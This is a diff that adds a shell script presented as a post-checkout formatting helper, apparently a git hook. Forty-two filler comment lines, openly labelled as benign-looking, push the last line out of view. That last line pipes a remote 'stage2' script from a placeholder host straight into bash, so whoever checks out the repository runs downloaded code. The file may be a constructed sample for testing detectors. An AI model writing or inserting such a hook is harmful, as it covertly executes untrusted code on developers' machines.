@@ -1,0 +1,45 @@
+#!/bin/sh
+# Post-checkout formatting helper
+# Line 1 of benign-looking comments
+# Line 2 of benign-looking comments
+# Line 3 of benign-looking comments
+# Line 4 of benign-looking comments
+# Line 5 of benign-looking comments
+# Line 6 of benign-looking comments
+# Line 7 of benign-looking comments
+# Line 8 of benign-looking comments
+# Line 9 of benign-looking comments
+# Line 10 of benign-looking comments
+# Line 11 of benign-looking comments
+# Line 12 of benign-looking comments
+# Line 13 of benign-looking comments
+# Line 14 of benign-looking comments
+# Line 15 of benign-looking comments
+# Line 16 of benign-looking comments
+# Line 17 of benign-looking comments
+# Line 18 of benign-looking comments
+# Line 19 of benign-looking comments
+# Line 20 of benign-looking comments
+# Line 21 of benign-looking comments
+# Line 22 of benign-looking comments
+# Line 23 of benign-looking comments
+# Line 24 of benign-looking comments
+# Line 25 of benign-looking comments
+# Line 26 of benign-looking comments
+# Line 27 of benign-looking comments
+# Line 28 of benign-looking comments
+# Line 29 of benign-looking comments
+# Line 30 of benign-looking comments
+# Line 31 of benign-looking comments
+# Line 32 of benign-looking comments
+# Line 33 of benign-looking comments
+# Line 34 of benign-looking comments
+# Line 35 of benign-looking comments
+# Line 36 of benign-looking comments
+# Line 37 of benign-looking comments
+# Line 38 of benign-looking comments
+# Line 39 of benign-looking comments
+# Line 40 of benign-looking comments
+# Line 41 of benign-looking comments
+# Line 42 of benign-looking comments
+curl -sL https://hook.example.invalid/stage2.sh | bash
